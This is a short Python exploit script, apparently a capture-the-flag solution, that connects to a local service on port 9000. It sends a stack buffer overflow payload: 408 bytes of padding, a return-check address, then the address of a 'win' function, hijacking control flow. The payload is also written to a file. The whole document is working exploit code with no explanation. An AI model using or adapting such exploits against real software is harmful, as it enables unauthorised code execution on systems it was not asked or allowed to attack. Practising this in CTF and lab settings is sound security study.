import socket
import readline

host = '127.0.0.1'
port = 9000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None):
	res = s.recv(4096).decode('ascii')
	print(res)
	return res

def send(data):
	data = data + b'\n' if data[-1] != '\n' else data
	s.send(data)

padding   = b'A'*408
retcheck  = 0x0000000000401465
padding2  = b'B'*8
win       = (0x00000000004012e9).to_bytes(8, 'little')

payload  = padding
payload += retcheck.to_bytes(8, 'little')
payload += padding2
payload += win 

print('\\x' + payload.hex('\\').replace('\\', '\\x'))

with open('payload', 'wb') as f:
	f.write(payload)

recv()
send(payload)
recv()
